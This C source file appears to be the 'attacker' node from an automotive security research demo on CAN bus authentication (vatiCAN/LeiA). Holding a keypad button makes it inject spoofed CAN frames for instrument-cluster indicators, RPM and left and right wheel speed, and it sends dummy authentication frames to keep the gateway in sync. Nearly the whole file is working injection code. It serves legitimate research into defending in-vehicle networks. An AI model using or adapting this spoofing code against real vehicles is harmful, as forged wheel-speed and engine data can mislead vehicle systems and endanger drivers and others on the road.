#include "attacker.h"
#include <sancus_support/pmodkypd.h>
#include <sancus_support/sm_io.h>
#include "../../drivers/ican.h"

#ifdef VATICAN_NONCE_SIZE
    #define attacker_send       ican_send
    #define attacker_dummy_send attacker_send_dummy_auth
#else
    #define attacker_send       attacker_send_ext
    #define attacker_dummy_send
#endif

int attacker_send_ext(ican_t *ican, uint16_t id, uint8_t *buf,
                      uint8_t len, int block)
{
    ican_eid_t eid = {id & 0x7ff, 0x0};
    return ican_send_ext(ican, eid, buf, len, block);
}

#define ic_ican_send attacker_send
#include "../../drivers/inst-cluster.h"

#define CAN_SPI_SS          1
#define CAN_ID_WHEEL_LEFT   0x20
#define CAN_ID_WHEEL_RIGHT  0x22

int attacker_init = 0;
int attacker_blink = 1, attacker_count = 0;
int attacker_pressed = 0, attacker_released = 0;
uint8_t attacker_rpm = 99;
uint8_t dummy = 0x0;

DECLARE_ICAN_SIMPLEX(attacker_ican, CAN_SPI_SS, CAN_500_KHZ);

int CAN_DRV_FUNC ican_send(ican_t *ican, uint16_t id, uint8_t *buf,
                           uint8_t len, int block);
int CAN_DRV_FUNC ican_send_ext(ican_t *ican, ican_eid_t eid, uint8_t *buf,
                           uint8_t len, int block);

// HACK: send empty authentication frame so the gateway doesn't get out of sync..
// NOTE: LeiA will drop message immediately as extended ID nonce is invalid (zero)
void attacker_send_dummy_auth( uint16_t id )
{
    volatile int i;
    for (int i =0; i < 100; i++){}; 
    attacker_send(&attacker_ican, id+1, &dummy, 1, /*block=*/1);
}

void attacker_key_pressed(PmodKypdKey k)
{
    pr_info1("key '%c' pressed!\n", pmodkypd_key_to_char(k));
    attacker_pressed = 1;

    attacker_count = 1;
}

void attacker_key_released(PmodKypdKey k)
{
    int rv;

    pr_info1("key '%c' released!\n", pmodkypd_key_to_char(k));
    attacker_pressed = 0;

    rv = ic_ind(&attacker_ican, 0, 0, /*warn=*/0);
    ASSERT(rv >= 0);
    rv = ic_rpm(&attacker_ican, 0);
    ASSERT(rv >= 0);
}

int attacker_run(void)
{
    int rv = 0;

    if (!attacker_init)
    {
        pmodkypd_init(attacker_key_pressed, attacker_key_released);
        ican_init(&attacker_ican);
        attacker_init = 1;
    }
    
    do {
        pmodkypd_poll(); 

        if (attacker_pressed && !attacker_count--)
        {
            attacker_count = 2000;
            attacker_blink = !attacker_blink;
            rv = ic_ind(&attacker_ican, attacker_blink, attacker_blink, /*warn=*/0);
            ASSERT(rv >= 0);
            attacker_dummy_send(IC_CAN_ID_IND);

            rv = ic_rpm(&attacker_ican, attacker_rpm);
            ASSERT(rv >= 0);
            attacker_dummy_send(IC_CAN_ID_RPM);

            rv = attacker_send(&attacker_ican, CAN_ID_WHEEL_LEFT, &attacker_rpm, 1, /*block=*/1);
            ASSERT(rv >= 0);
            attacker_dummy_send(CAN_ID_WHEEL_LEFT);
            rv = attacker_send(&attacker_ican, CAN_ID_WHEEL_RIGHT, &attacker_rpm, 1, /*block=*/1);
            ASSERT(rv >= 0);
            attacker_dummy_send(CAN_ID_WHEEL_RIGHT);

            rv = 1;
        }

    } while (attacker_pressed);

    return rv;
}
